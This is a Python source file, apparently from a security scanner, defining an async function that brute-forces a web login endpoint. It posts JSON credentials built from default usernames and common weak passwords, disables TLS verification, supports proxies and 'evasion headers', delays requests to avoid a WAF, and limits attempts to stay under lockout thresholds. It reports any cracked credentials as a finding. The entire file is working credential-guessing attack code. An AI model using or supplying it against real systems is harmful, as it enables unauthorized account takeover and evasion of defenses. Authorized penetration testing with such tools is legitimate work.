import aiohttp
import asyncio
import itertools

async def exploit_smart_brute(url, usernames=None, log_callback=None, headers=None, proxy=None):
    """
    Attempts Target Brute Force using discovered usernames.
    Sensitive to Lockout policies (tries small set).
    """
    findings = []
    
    # Evasion Headers
    final_headers = headers.copy() if headers else {}
    
    if not usernames:
        # Fallback to generic Top 5
        usernames = ["admin", "administrator", "root", "test", "user"]
        
    # Common weak passwords (Top 10)
    passwords = [
        "123456", "password", "12345678", "qwerty", "12345", 
        "admin", "welcome", "123456789", "1234", "login"
    ]
    
    # Also add user as password
    
    target_creds = []
    for u in usernames:
        target_creds.append((u, u)) # User == Pass
        target_creds.append((u, "123456"))
        target_creds.append((u, "password"))
        target_creds.append((u, u+"123"))
    
    # We assume 'url' is the login action URL. If not, auto-detect is hard.
    # We will assume JSON POST or Form POST.
    
    # Limit attempts
    max_attempts = 15
    attempts = 0
    
    try:
        async with aiohttp.ClientSession(headers=final_headers) as session:
            for u, p in target_creds:
                if attempts >= max_attempts: break
                
                # Try JSON
                try:
                    payload = {"username": u, "password": p}
                    if log_callback: log_callback(f"   üê∫ Smart Brute: Trying {u}:{p}...")
                    
                    async with session.post(url, json=payload, timeout=5, ssl=False, proxy=proxy) as resp:
                        attempts += 1
                        if resp.status == 200:
                            text = await resp.text()
                            if "token" in text or "success" in text.lower() or "dashboard" in text.lower():
                                findings.append({
                                    "type": "Weak Password (Brute Force)",
                                    "severity": "High",
                                    "detail": f"Successfully cracked account.",
                                    "evidence": f"Creds: {u}:{p}",
                                    "remediation": "Enforce strong password policy and rate limiting."
                                })
                                return findings
                except Exception: pass
                
                await asyncio.sleep(0.5) # Avoid WAF (and use evasion delay later)
                
    except Exception: pass
    
    return findings
